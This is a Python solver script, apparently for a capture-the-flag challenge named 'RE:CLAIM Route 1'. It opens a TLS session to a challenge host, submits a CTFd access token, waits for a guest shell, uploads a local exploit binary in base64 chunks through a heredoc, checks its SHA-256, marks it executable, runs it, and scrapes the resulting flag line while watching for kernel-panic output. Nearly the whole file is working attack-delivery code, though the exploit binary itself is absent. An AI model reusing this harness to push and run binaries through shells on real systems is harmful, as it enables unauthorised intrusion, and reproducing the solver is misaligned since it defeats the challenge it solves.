#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import getpass
import gzip
import hashlib
import re
import secrets
import socket
import ssl
import sys
import time
from pathlib import Path


FLAG_LINE = re.compile(rb"(?:^|\n)\[RELEASE-A-VAULT-TERMINAL\] (SHA\{[^}\r\n]{1,506}\})\r?\n")
PANIC = re.compile(rb"(?:Kernel panic|BUG:|Oops:|general protection fault)", re.I)
MAX_TRANSCRIPT = 32 * 1024 * 1024


class Session:
    def __init__(self, sock: ssl.SSLSocket):
        self.sock = sock
        self.transcript = bytearray()

    def send(self, data: bytes) -> None:
        # expect() uses short receive timeouts. Do not inherit one of those for
        # a multi-megabyte compressed exploit upload.
        self.sock.settimeout(30)
        self.sock.sendall(data)

    def expect(self, predicate, timeout: float, description: str) -> bytes:
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline:
            current = bytes(self.transcript)
            if predicate(current):
                return current
            self.sock.settimeout(min(1.0, max(0.1, deadline - time.monotonic())))
            try:
                chunk = self.sock.recv(65536)
            except (TimeoutError, socket.timeout):
                continue
            if not chunk:
                break
            self.transcript.extend(chunk)
            if len(self.transcript) > MAX_TRANSCRIPT:
                raise RuntimeError("remote transcript exceeded the safety limit")
        raise RuntimeError(f"timed out waiting for {description}")


def token_from_operator() -> bytes:
    if sys.stdin.isatty():
        value = getpass.getpass("Participant CTFd Access Token: ")
    else:
        value = sys.stdin.readline().rstrip("\r\n")
    try:
        token = value.encode("ascii")
    except UnicodeEncodeError as error:
        raise SystemExit("Access Token must be ASCII") from error
    if not token or len(token) > 512 or any(byte < 0x21 or byte > 0x7E for byte in token):
        raise SystemExit("Access Token is empty or malformed")
    return token


def fixed_diagnostic(transcript: bytes) -> str:
    checks = {
        "auth": b"Authenticated." in transcript,
        "slot": b"Slot allocated." in transcript,
        "ready": b" ready; " in transcript,
        "shell": b"/ $" in transcript,
        "upload_hash": b"[RECLAIM-SOLVE] upload_sha256=" in transcript,
    }
    return " ".join(f"{key}={int(value)}" for key, value in checks.items())


def main() -> int:
    parser = argparse.ArgumentParser(description="Run the verified RE:CLAIM Route 1 exploit")
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, default=31337)
    parser.add_argument("--server-name", required=True)
    parser.add_argument("--ca-file")
    parser.add_argument("--insecure", action="store_true", help="disable TLS verification (lab only)")
    parser.add_argument("--exploit", type=Path, default=Path(__file__).with_name("exploit"))
    parser.add_argument("--timeout", type=int, default=300)
    args = parser.parse_args()
    if not args.exploit.is_file():
        raise SystemExit("exploit binary is missing")

    exploit = args.exploit.read_bytes()
    exploit_hash = hashlib.sha256(exploit).hexdigest().encode("ascii")
    compressed = gzip.compress(exploit, compresslevel=9, mtime=0)
    encoded = base64.b64encode(compressed)
    token = token_from_operator()

    context = ssl.create_default_context(cafile=args.ca_file)
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    if args.insecure:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

    remote_name = "/tmp/reclaim-" + secrets.token_hex(6)
    session: Session | None = None
    try:
        with socket.create_connection((args.host, args.port), timeout=10) as raw:
            raw.setblocking(True)
            with context.wrap_socket(raw, server_hostname=args.server_name) as sock:
                session = Session(sock)
                session.expect(lambda data: b"Token: " in data, 10, "gateway token prompt")
                session.send(token + b"\n")
                session.expect(lambda data: b"/ $" in data, 150, "uid-1000 guest shell")
                if token in session.transcript:
                    raise RuntimeError("gateway echoed or forwarded the bearer token")
                token = b""

                session.send(b"stty -echo\n")
                session.expect(lambda data: data.count(b"/ $") >= 2, 10, "post-stty shell prompt")
                commands = [
                    f"base64 -d >{remote_name}.gz <<'__RECLAIM_UPLOAD__'\n".encode(),
                ]
                session.send(commands[0])
                for offset in range(0, len(encoded), 1024):
                    session.send(encoded[offset : offset + 1024] + b"\n")
                session.send(b"__RECLAIM_UPLOAD__\n")
                session.send(f"gzip -d {remote_name}.gz\n".encode())
                session.send(
                    b"echo '[RECLAIM-SOLVE] upload_sha256='$(sha256sum "
                    + remote_name.encode() + b" | cut -d' ' -f1)\n"
                )
                session.send(f"chmod 700 {remote_name}\n".encode())
                session.send(f"{remote_name}\n".encode())

                transcript = session.expect(
                    lambda data: FLAG_LINE.search(data) is not None,
                    args.timeout,
                    "flag terminal",
                ).replace(b"\r", b"")
                terminal = FLAG_LINE.search(transcript)
                if terminal is None:
                    raise RuntimeError("flag terminal disappeared from transcript")
                fault = PANIC.search(transcript)
                if fault is not None and fault.start() < terminal.start():
                    raise RuntimeError("guest faulted before the flag terminal")
                expected_hash_line = b"[RECLAIM-SOLVE] upload_sha256=" + exploit_hash
                if expected_hash_line not in transcript:
                    raise RuntimeError("guest upload SHA-256 verification failed")
                matches = FLAG_LINE.findall(transcript)
                if len(matches) != 1:
                    raise RuntimeError("flag output cardinality was not one")
                # The real guest-produced flag is terminal; do not wait for a
                # clean process or VM exit after this point.
                print(matches[0].decode("ascii"))
                return 0
    except (OSError, ssl.SSLError, RuntimeError) as error:
        transcript = bytes(session.transcript) if session is not None else b""
        raise SystemExit(f"solver failed: {error}; {fixed_diagnostic(transcript)}") from None


if __name__ == "__main__":
    raise SystemExit(main())
